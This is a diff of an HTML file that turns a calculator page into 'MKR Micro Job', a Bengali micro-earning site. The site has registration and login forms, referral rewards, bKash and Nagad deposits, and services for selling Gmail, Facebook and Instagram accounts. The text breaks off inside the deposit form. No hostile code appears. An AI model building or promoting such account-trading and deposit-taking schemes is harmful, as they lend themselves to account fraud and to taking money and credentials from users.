@@ -3,49 +3,1628 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Red Calculator</title>
-    <!-- অ্যাপ হিসেবে কাজ করার জন্য -->
-    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIlJlZCBDYWxjdWxhdG9yIiwKICAic2hvcnRfbmFtZSI6ICJDb2xjIiwKICAic3RhcnRfdXJsIjogIi4vaW5kZXguaHRtbCIsCiAgImRpc3BsYXkiOiAic3RhbmRhbG9uZSIsCiAgImJhY2tncm91bmRfY29sb3IiOiAiI2ZmZmZmZiIsCiAgInRoZW1lX2NvbG9yIjogIiNkOTMwMjUiLAogICJpY29ucyI6IFsgewogICAgInNyYyI6ICJodHRwczovL2Nkbi1pY29ucy1wbmcuZmxhdGljb24uY29tLzUxMi81NjQvNTY0NDE5LnBuZyIsCiAgICAic2l6ZXMiOiAiMTkyeDE5MiIsCiAgICAidHlwZSI6ICJpbWFnZS9wbmciCiAgfV0KfQ==">
-    
+    <title>MKR Micro Job - Micro Job & Earning</title>
+    <!-- এসইও এবং গুগলে চেনার জন্য মেটা ট্যাগ -->
+    <meta name="author" content="Abul Kalam">
+    <meta name="description" content="MKR Micro Job - Abul Kalam এর মাইক্রো জব ওয়েবসাইট। এখানে কাজ করে সহজে আয় করুন।">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* আপনার পুরনো ক্যালকুলেটরের ডিজাইন */
-        body { display: flex; flex-direction: column; justify-content: flex-end; height: 100vh; margin: 0; background-color: #fff; font-family: sans-serif; }
-        #result { font-size: 50px; text-align: right; padding: 20px; color: #202124; }
-        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; padding: 10px; }
-        button { height: 70px; font-size: 25px; border: none; border-radius: 35px; background: #f8f9fa; color: #d93025; }
-        .equal { background: #d93025; color: white; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            /* আরও উজ্জ্বল ও ঝিলমিলে ডায়নামিক ব্যাকগ্রাউন্ড */
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background-attachment: fixed;
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            padding-bottom: 70px;
+            color: #fff;
+        }
+
+        .navbar {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .navbar h2 {
+            font-size: 17px;
+            color: #00f2fe;
+            font-weight: 700;
+            text-shadow: 0 0 12px rgba(0, 242, 254, 0.6);
+        }
+
+        /* প্রোফাইল ড্রপডাউন কন্টেইনার */
+        .profile-container {
+            position: relative;
+        }
+
+        .profile-icon {
+            width: 35px;
+            height: 35px;
+            background: linear-gradient(135deg, #00f2fe, #4facfe);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.8);
+        }
+
+        /* ড্রপডাউন মেনু স্টাইল */
+        .profile-dropdown {
+            position: absolute;
+            right: 0;
+            top: 45px;
+            background: #1f2937;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 16px;
+            width: 200px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 200;
+            backdrop-filter: blur(15px);
+        }
+
+        .profile-dropdown.active {
+            display: flex;
+        }
+
+        .dropdown-item {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #e2e8f0;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+
+        .dropdown-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #00f2fe;
+        }
+
+        .dropdown-item i {
+            font-size: 15px;
+            color: #00f2fe;
+        }
+
+        .dropdown-item.logout {
+            color: #ef4444;
+        }
+
+        .dropdown-item.logout i {
+            color: #ef4444;
+        }
+
+        /* সাইডবার মেনু স্টাইল */
+        .sidebar {
+            position: fixed;
+            left: -100%;
+            top: 0;
+            width: 75%;
+            height: 100%;
+            background: #111827;
+            z-index: 1000;
+            transition: 0.3s ease;
+            box-shadow: 5px 0 25px rgba(0,0,0,0.5);
+            padding: 20px;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .sidebar.active {
+            left: 0;
+        }
+
+        .sidebar-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        .sidebar-menu {
+            list-style: none;
+        }
+
+        .sidebar-menu li {
+            padding: 12px 15px;
+            margin-bottom: 8px;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #cbd5e1;
+            font-weight: 600;
+            font-size: 14px;
+            transition: 0.3s;
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .sidebar-menu li:hover {
+            background: linear-gradient(135deg, #00f2fe, #4facfe);
+            color: #000;
+            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.4);
+        }
+
+        .sidebar-menu li i {
+            font-size: 16px;
+            color: #00f2fe;
+        }
+
+        .sidebar-menu li:hover i {
+            color: #000;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(3px);
+            display: none;
+            z-index: 999;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+
+        .section-page {
+            display: none;
+        }
+
+        .section-page.active {
+            display: block;
+        }
+
+        .notice-bar {
+            background: linear-gradient(135deg, rgba(0, 242, 254, 0.15), rgba(79, 172, 254, 0.15));
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            margin: 15px;
+            padding: 12px 15px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            font-size: 13px;
+            color: #e2e8f0;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .notice-bar i {
+            color: #00f2fe;
+            font-size: 16px;
+        }
+
+        /* ঝিলমিলে বা glowing ব্যালেন্স কার্ড */
+        .balance-card {
+            background: linear-gradient(135deg, #ff007f, #7928ca, #00f2fe);
+            background-size: 200% 200%;
+            animation: glowingGradient 5s ease infinite;
+            color: white;
+            padding: 22px;
+            border-radius: 20px;
+            margin: 15px;
+            position: relative;
+            box-shadow: 0 0 25px rgba(255, 0, 127, 0.5), 0 0 45px rgba(0, 242, 254, 0.3);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes glowingGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .balance-card p {
+            font-size: 11px;
+            color: #fff;
+            letter-spacing: 1px;
+            font-weight: 700;
+            text-shadow: 0 0 5px rgba(0,0,0,0.5);
+        }
+
+        .balance-card h1 {
+            font-size: 34px;
+            margin: 8px 0;
+            color: #fff;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8), 0 0 25px rgba(0, 242, 254, 0.8);
+            font-weight: 800;
+        }
+
+        .earn-btn {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 10px rgba(255,255,255,0.2);
+        }
+
+        .action-btns {
+            display: flex;
+            gap: 10px;
+        }
+
+        .action-btns button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: 0.3s;
+        }
+
+        .action-btns button span {
+            font-size: 10px;
+            font-weight: normal;
+            opacity: 0.9;
+        }
+
+        .btn-dep { background: linear-gradient(135deg, #00b09b, #96c93d); color: white; box-shadow: 0 0 15px rgba(0, 176, 155, 0.5); }
+        .btn-with { background: linear-gradient(135deg, #ff416c, #ff4b2b); color: white; box-shadow: 0 0 15px rgba(255, 65, 108, 0.5); }
+
+        .social-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            padding: 0 15px;
+            margin-bottom: 15px;
+        }
+
+        .social-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 15px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .social-card:hover {
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: #00f2fe;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
+        }
+
+        .social-card i {
+            font-size: 24px;
+        }
+
+        .social-card h4 {
+            font-size: 13px;
+            color: #f8fafc;
+        }
+
+        .social-card p {
+            font-size: 10px;
+            color: #94a3b8;
+        }
+
+        /* রেফার কার্ড স্টাইল */
+        .refer-card {
+            background: linear-gradient(135deg, rgba(255, 0, 127, 0.15), rgba(0, 242, 254, 0.15));
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            margin: 0 15px 20px 15px;
+            padding: 18px;
+            border-radius: 18px;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.15);
+            backdrop-filter: blur(10px);
+        }
+
+        .refer-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .refer-header i {
+            font-size: 24px;
+            color: #00f2fe;
+            text-shadow: 0 0 10px rgba(0, 242, 254, 0.8);
+        }
+
+        .refer-header h4 {
+            font-size: 14px;
+            color: #f8fafc;
+        }
+
+        .refer-header p {
+            font-size: 11px;
+            color: #cbd5e1;
+        }
+
+        .refer-link-box {
+            display: flex;
+            background: rgba(17, 24, 39, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            overflow: hidden;
+            padding: 4px;
+        }
+
+        .refer-link-box input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 8px 12px;
+            color: #00f2fe;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .refer-copy-btn {
+            background: linear-gradient(135deg, #00f2fe, #4facfe);
+            border: none;
+            padding: 8px 15px;
+            color: #000;
+            font-weight: bold;
+            font-size: 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            white-space: nowrap;
+            box-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
+        }
+
+        .section-title {
+            padding: 0 15px;
+            font-size: 15px;
+            color: #f8fafc;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            padding: 0 15px 20px 15px;
+        }
+
+        .service-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px 10px;
+            text-align: center;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .service-card:hover {
+            transform: translateY(-5px);
+            background: linear-gradient(135deg, rgba(0, 242, 254, 0.2), rgba(255, 0, 127, 0.2));
+            border-color: rgba(0, 242, 254, 0.5);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
+        }
+
+        .service-card i {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .service-card h4 {
+            font-size: 13px;
+            color: #f8fafc;
+            margin-bottom: 2px;
+        }
+
+        .service-card p {
+            font-size: 10px;
+            color: #94a3b8;
+        }
+
+        .service-top-card {
+            background: linear-gradient(135deg, #00f2fe, #4facfe);
+            color: #000;
+            padding: 20px;
+            border-radius: 16px;
+            margin: 15px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.4);
+            font-weight: 600;
+        }
+
+        .service-top-card h3 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .service-top-card p {
+            font-size: 11px;
+            color: #051c24;
+            margin-bottom: 15px;
+        }
+
+        .stats-row {
+            display: flex;
+            justify-content: space-around;
+            border-top: 1px solid rgba(0, 0, 0, 0.2);
+            padding-top: 15px;
+        }
+
+        .stat-box span {
+            font-size: 10px;
+            color: #051c24;
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .stat-box h2 {
+            font-size: 16px;
+            color: #000;
+        }
+
+        .password-box, .deposit-info-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            margin: 15px;
+            padding: 15px;
+            border-radius: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .pass-text span {
+            display: block;
+            font-size: 11px;
+            color: #94a3b8;
+        }
+
+        .pass-text strong {
+            font-size: 14px;
+            color: #00f2fe;
+            text-shadow: 0 0 8px rgba(0, 242, 254, 0.5);
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, #00f2fe, #4facfe);
+            border: none;
+            padding: 8px 14px;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #000;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
+        }
+
+        .submit-form-card, .auth-card {
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(15px);
+            margin: 15px;
+            padding: 22px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .form-heading {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-heading h3 {
+            font-size: 18px;
+            color: #00f2fe;
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
+        }
+
+        .form-heading p {
+            font-size: 11px;
+            color: #cbd5e1;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #e2e8f0;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        .input-field {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-field i:first-child {
+            position: absolute;
+            left: 15px;
+            color: #00f2fe;
+            font-size: 14px;
+        }
+
+        .input-field input, .input-field select {
+            width: 100%;
+            padding: 12px 15px 12px 45px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            outline: none;
+            font-size: 14px;
+            background: rgba(17, 24, 39, 0.6);
+            color: #fff;
+        }
+
+        .input-field input::placeholder {
+            color: #64748b;
+        }
+
+        .input-field input:focus, .input-field select:focus {
+            border-color: #00f2fe;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.5);
+        }
+
+        .report-note {
+            font-size: 11px;
+            color: #fbbf24;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(251, 191, 36, 0.1);
+            padding: 8px 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(251, 191, 36, 0.2);
+        }
+
+        .submit-account-btn, .auth-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00f2fe, #ff007f);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.5);
+            transition: 0.3s;
+        }
+
+        .submit-account-btn:hover, .auth-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(255, 0, 127, 0.8);
+        }
+
+        .auth-switch {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+
+        .auth-switch span {
+            color: #00f2fe;
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            color: #00f2fe;
+        }
+
+        .admin-support {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: linear-gradient(135deg, #00f2fe, #00c6ff);
+            color: black;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.8);
+            text-decoration: none;
+            z-index: 100;
+        }
+
+        .calc-box {
+            background: rgba(17, 24, 39, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+        .calc-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+        }
+        .calc-row.fee {
+            color: #ef4444;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 8px;
+        }
+        .calc-row.total {
+            color: #00f2fe;
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 0;
+            padding-top: 5px;
+            text-shadow: 0 0 8px rgba(0, 242, 254, 0.5);
+        }
+        .number-display-box {
+            background: rgba(17, 24, 39, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .number-display-box span {
+            font-size: 12px;
+            color: #94a3b8;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .number-display-box strong {
+            font-size: 16px;
+            color: #00f2fe;
+            letter-spacing: 1px;
+            text-shadow: 0 0 8px rgba(0, 242, 254, 0.5);
+        }
     </style>
 </head>
 <body>
-    <div id="result">0</div>
-    <div class="buttons">
-        <button onclick="clearScreen()">C</button>
-        <button onclick="appendValue('%')">%</button>
-        <button onclick="backspace()">DEL</button>
-        <button onclick="appendValue('/')">÷</button>
-        <button onclick="appendValue('7')">7</button>
-        <button onclick="appendValue('8')">8</button>
-        <button onclick="appendValue('9')">9</button>
-        <button onclick="appendValue('*')">×</button>
-        <button onclick="appendValue('4')">4</button>
-        <button onclick="appendValue('5')">5</button>
-        <button onclick="appendValue('6')">6</button>
-        <button onclick="appendValue('-')">-</button>
-        <button onclick="appendValue('1')">1</button>
-        <button onclick="appendValue('2')">2</button>
-        <button onclick="appendValue('3')">3</button>
-        <button onclick="appendValue('+')">+</button>
-        <button onclick="appendValue('00')">00</button>
-        <button onclick="appendValue('0')">0</button>
-        <button onclick="appendValue('.')">.</button>
-        <button class="equal" onclick="calculate()">=</button>
+
+    <!-- ওভারলে এবং সাইডবার মেনু -->
+    <div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2 style="font-size: 16px; color: #00f2fe;">MKR Micro Job</h2>
+            <i class="fa-solid fa-xmark" style="font-size: 18px; cursor: pointer; color: #fff;" onclick="toggleSidebar()"></i>
+        </div>
+        <ul class="sidebar-menu">
+            <li onclick="toggleSidebar(); showPage('homePage');"><i class="fa-solid fa-house"></i> হোম পেজ</li>
+            <li onclick="toggleSidebar(); showPage('depositPage');"><i class="fa-solid fa-wallet"></i> ডিপোজিট করুন</li>
+            <li onclick="toggleSidebar(); showPage('withdrawPage');"><i class="fa-solid fa-money-bill-transfer"></i> উইথড্র করুন</li>
+            <li onclick="toggleSidebar(); showPage('gmailPage');"><i class="fa-solid fa-envelope"></i> জিমেইল সেল</li>
+            <li onclick="toggleSidebar(); showPage('facebookPage');"><i class="fa-brands fa-facebook"></i> ফেসবুক সেল</li>
+            <li onclick="toggleSidebar(); showPage('instagramPage');"><i class="fa-brands fa-instagram"></i> ইনস্টাগ্রাম সেল</li>
+            <li onclick="toggleSidebar(); showPage('registerPage');"><i class="fa-solid fa-user-plus"></i> রেজিস্ট্রেশন পেজ</li>
+            <li onclick="toggleSidebar(); showPage('loginPage');"><i class="fa-solid fa-right-to-bracket"></i> লগইন পেজ</li>
+        </ul>
     </div>
+
+    <!-- ১. প্রথম পেজ: রেজিস্ট্রেশন পেজ -->
+    <div id="registerPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <h2>Register - MKR Micro Job</h2>
+            </div>
+        </header>
+        <div class="auth-card">
+            <div class="form-heading">
+                <h3>✨ স্বাগত! প্রথমে একাউন্ট তৈরি করুন ✨</h3>
+                <p>নাম, জিমেইল, ফোন নাম্বার ও পাসওয়ার্ড দিয়ে তথ্য সাবমিট করুন (ডিভাইস প্রতি সর্বোচ্চ ৩টি অ্যাকাউন্ট)</p>
+            </div>
+            <form onsubmit="checkDeviceLimit(event)">
+                <div class="input-group">
+                    <label>Full Name</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-user"></i>
+                        <input type="text" id="regName" placeholder="আপনার পুরো নাম লিখুন" autocomplete="name" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-phone"></i>
+                        <input type="tel" id="regPhone" placeholder="আপনার Phone নাম্বার দিন" autocomplete="tel" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Email Address (Gmail)</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-envelope"></i>
+                        <input type="email" id="regEmail" placeholder="আপনার জিমেইল একাউন্ট" autocomplete="email" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Password (পাসওয়ার্ড দিন)</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" id="regPass" placeholder="প্রথম পাসওয়ার্ড/পিন লিখুন" autocomplete="new-password" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Confirm Password (পুনরায় পাসওয়ার্ড দিন)</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" id="regPassConfirm" placeholder="দ্বিতীয় পাসওয়ার্ড/পিন আবার লিখুন" autocomplete="new-password" required>
+                    </div>
+                </div>
+                <button type="submit" class="auth-btn">SUBMIT & REGISTER →</button>
+                <div class="auth-switch">
+                    ইতিমধ্যেই একাউন্ট আছে? <span onclick="showPage('loginPage')">লগইন করুন</span>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- লগইন পেজ -->
+    <div id="loginPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <h2>Login - MKR Micro Job</h2>
+            </div>
+        </header>
+        <div class="auth-card">
+            <div class="form-heading">
+                <h3>স্বাগত!</h3>
+                <p>আপনার জিমেইল ও পাসওয়ার্ড দিয়ে লগইন করুন</p>
+            </div>
+            <form onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Email (Gmail)</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-envelope"></i>
+                        <input type="email" id="loginEmail" placeholder="আপনার জিমেইল দিন" autocomplete="email" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" id="loginPass" placeholder="পাসওয়ার্ড দিন" autocomplete="current-password" required>
+                    </div>
+                </div>
+                <button type="submit" class="auth-btn">লগইন করুন</button>
+                <div class="auth-switch">
+                    কোনো একাউন্ট নেই? <span onclick="showPage('registerPage')">নতুন একাউন্ট তৈরি করুন</span>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- হোম পেজ সেকশন -->
+    <div id="homePage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <i class="fa-solid fa-bars" style="font-size: 18px; color: #00f2fe; cursor: pointer;" onclick="toggleSidebar()"></i>
+                <h2>MKR Micro Job</h2>
+            </div>
+            
+            <!-- ডান কোণের প্রোফাইল আইকন এবং ড্রপডাউন মেনু -->
+            <div class="profile-container">
+                <div class="profile-icon" onclick="toggleProfileDropdown(event)">
+                    <i class="fa-solid fa-user"></i>
+                </div>
+                <div class="profile-dropdown" id="profileDropdown">
+                    <div class="dropdown-item" onclick="alert('Profile পেজটি টেস্টিং মোডে আছে')"><i class="fa-solid fa-user"></i> Profile</div>
+                    <div class="dropdown-item" onclick="alert('Top Referred পেজ')"><i class="fa-solid fa-trophy" style="color: #fbbf24;"></i> Top (100) Reffered</div>
+                    <div class="dropdown-item logout" onclick="handleLogout()"><i class="fa-solid fa-power-off"></i> Logout</div>
+                </div>
+            </div>
+        </header>
+
+        <div class="notice-bar">
+            <i class="fa-solid fa-bullhorn"></i>
+            <span>MKR Micro Job | কাজ করে সহজেই আয় করুন ঘরে বসে।</span>
+        </div>
+
+        <div class="dashboard">
+            <!-- ঝিলমিলে ব্যাকগ্রাউন্ড সহ টোটাল ব্যালেন্স কার্ড -->
+            <div class="balance-card">
+                <p>TOTAL BALANCE</p>
+                <h1>৳0.00</h1>
+                <button class="earn-btn"><i class="fa-solid fa-chart-line"></i> কাজ করে আয় করুন আরও বেশি</button>
+                <div class="action-btns">
+                    <button class="btn-dep" onclick="showPage('depositPage')">Deposit <span>ব্যালেেন্স যোগ করুন</span></button>
+                    <button class="btn-with" onclick="showPage('withdrawPage')">Withdraw <span>ব্যালেেন্স উত্তোলন করুন</span></button>
+                </div>
+            </div>
+
+            <!-- রেফার করুন (Refer & Earn) সেকশন -->
+            <div class="refer-card">
+                <div class="refer-header">
+                    <i class="fa-solid fa-users"></i>
+                    <div>
+                        <h4>Refer & Earn (রেফার করে আয় করুন)</h4>
+                        <p>বন্ধু রেফার করলেই পাবেন ৳১০.০০ (শর্ত: রেফারকৃত ইউজার অন্তত ১টি কাজ সাবমিট করতে হবে)</p>
+                    </div>
+                </div>
+                <div class="refer-link-box">
+                    <input type="text" id="myReferLink" value="" readonly>
+                    <button type="button" class="refer-copy-btn" onclick="copyReferLink(this)"><i class="fa-solid fa-copy"></i> Copy</button>
+                </div>
+            </div>
+
+            <div class="social-grid">
+                <a href="https://t.me/abulkalam_mkr_bot" target="_blank" class="social-card">
+                    <i class="fa-brands fa-telegram" style="color: #00f2fe;"></i>
+                    <div>
+                        <h4>Telegram</h4>
+                        <p>আমাদের টেলিগ্রাম চ্যানেল</p>
+                    </div>
+                </a>
+                <a href="#" class="social-card">
+                    <i class="fa-brands fa-youtube" style="color: #ff0000;"></i>
+                    <div>
+                        <h4>YouTube</h4>
+                        <p>আমাদের ইউটিউব চ্যানেল</p>
+                    </div>
+                </a>
+            </div>
+
+            <h3 class="section-title">আমাদের ডিজিটাল সেবাসমূহ</h3>
+            <div class="services-grid">
+                <div class="service-card" onclick="showPage('gmailPage')">
+                    <i class="fa-solid fa-envelope" style="color: #ff4b2b;"></i>
+                    <h4>Gmail Sell</h4>
+                    <p>জিমেইল একাউন্ট</p>
+                </div>
+                <div class="service-card" onclick="showPage('facebookPage')">
+                    <i class="fa-brands fa-facebook" style="color: #00f2fe;"></i>
+                    <h4>Facebook</h4>
+                    <p>ফেসবুক সার্ভিস</p>
+                </div>
+                <div class="service-card" onclick="showPage('instagramPage')">
+                    <i class="fa-brands fa-instagram" style="color: #ff007f;"></i>
+                    <h4>Instagram</h4>
+                    <p>ইনস্টাগ্রাম সার্ভিস</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ডিপোজিট পেজ -->
+    <div id="depositPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Deposit Balance</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="service-top-card">
+                <h3><i class="fa-solid fa-wallet"></i> Deposit Balance</h3>
+                <p>সঠিক তথ্য দিয়ে ডিপোজিট করুন, ৫-৩০ মিনিটে ব্যালেন্স যোগ হবে।</p>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>অটোমেটিক পেমেন্ট করুন</h3>
+                    <p>ইনস্ট্যান্ট ব্যালেন্স অ্যাড হবে</p>
+                </div>
+                
+                <form id="depositForm" onsubmit="submitDeposit(event)">
+                    <div class="input-group">
+                        <label>পেমেন্ট মেথড সিলেক্ট করুন</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-wallet"></i>
+                            <select id="depMethod" onchange="updateDepositInfo()" required>
+                                <option value="Bkash">Bkash (0.00% Charge)</option>
+                                <option value="Nagad">Nagad (0.00% Charge)</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- নাম্বার প্রদর্শন এবং কপি বক্স -->
+                    <div class="number-display-box">
+                        <div>
